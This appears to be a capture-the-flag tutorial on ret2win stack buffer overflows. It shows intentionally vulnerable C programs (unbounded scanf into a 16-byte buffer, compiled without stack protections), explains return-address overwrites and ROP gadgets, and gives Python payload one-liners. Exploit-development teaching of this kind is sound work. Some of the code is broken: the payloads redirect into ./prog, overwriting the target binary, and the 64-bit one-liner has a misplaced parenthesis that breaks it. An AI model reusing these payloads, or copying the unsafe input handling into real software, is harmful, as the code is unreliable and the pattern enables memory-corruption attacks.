```c
#include <stdio.h>

void win(int first, int second)
{
    if (first == 0xdeadbeef && second == 0xc0debabe){
        printf("This function is TOP SECRET! How did you get in here?! :O\n");
    }else{
        printf("Unauthorised access to secret function detected, authorities have been alerted!!\n");
    }

    return;
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);    
}

int main()
{
    register_name();

    return 0;
}
```

```bash
gcc prog.c -o prog -fno-stack-protector -z execstack -no-pie -m32
```

This `ret2win` challenge is slightly modified from the usual `ret2win` challenge. The `win` function requires 2 parameters `first` and `second` to hold a certain value.

To overwrite the return address, we can do the same thing as [[Ret2Win]]. Input 28 characters + the address of the `win` function.

After we jump to the `win` function, we'll need to add data of the parameters to the stack so that the function can read those parameters. Since the stack grows downwards, once we've overwritten the `win` return address, we can overwrite data in higher memory with our parameter data.

We don't need to write local variables to the stack, we need to write the return address (since every functions need that) along with the parameters. So we write the return address (since it's higher in the stack, and therefore, lower in the memory), then write parameter 1, then parameter 2. The return address could be just junk data because all we care about in this challenge is running the code inside the `win` function.

Here's the python script:

```python
python -c 'import sys; sys.stdout.buffer.write(b"A" * 28 + b"\x82\x91\x04\x08" + b"junk" + b"\xef\xbe\xad\xde" + b"\xbe\xba\xde\xc0")' > ./prog
```

Let's talk about the 64-bit version of this program. 

```c
#include <stdio.h>

void win(long first, long second)
{
    if (first == 0xdeadbeefdeadbeef && second == 0xc0debabec0debabe){
        printf("This function is TOP SECRET! How did you get in here?! :O\n");
    }else{
        printf("Unauthorised access to secret function detected, authorities have been alerted!!\n");
    }
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);    
}

int main()
{
    register_name();

    return 0;
}
```

```bash
gcc prog.c -o prog -fno-stack-protector -z execstack -no-pie
```

The 64-bit version uses longer hex numbers to verify the `first` and `second` parameters. Another different thing about this is that the parameter will not be passed in to the function by the stack, it will be passed into the function by registers using the [System V AMD64 ABI](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI). So we need to somehow put our parameter data into the `rdi` and `rsi` registers.

Testing the input will give us that the 25th-32nd bytes of our input will overwrite the return address of `register_name`. We can put the parameter data into the parameter registers by utilizing some ROP (Return-oriented programming) gadgets. What we can do is insert a `pop rdi` along with our `rdi` value, then insert a `pop rsi` along with our `rsi` value. The `pop` instruction will be read by the program before the parameter value, then it will be popped from the stack and executed. When the `pop` instruction is executed, the parameter value will be on top of the stack, meaning it will be popped into the register specified by our `pop` instruction. We can use tools like [Ropper](https://github.com/sashs/Ropper) to generate the ROP gadget for `pop rdi` and `pop rsi`.

In this case, our `pop rdi` and `pop rsi` gadgets will be these 2:

```assembly
0x40124b: pop rdi; ret
0x401249: pop rsi; pop r15; ret
```

So our payload structure will look something like this (We need to initialize the parameters before we overwrite the return address):

```
padding + pop_rdi + param1 + pop_rsi + param2 + junk_data + function_address
```

This is the python script:

```python
python -c 'import sys; sys.stdout.buffer.write(b"A" * 24 + b"\x4b\x12\x40\x00\x00\x00\x00\x00" + b"\xef\xbe\xad\xde\xef\xbe\xad\xde" + b"\x49\x12\x40\x00\x00\x00\x00\x00" + b"\xbe\xba\xde\xc0\xbe\xba\xde\xc0") + b"\x00\x00\x00\x00\x00\x00\x00\x00" + b"\x42\x11\x40\x00\x00\x00\x00\x00"' > ./prog
```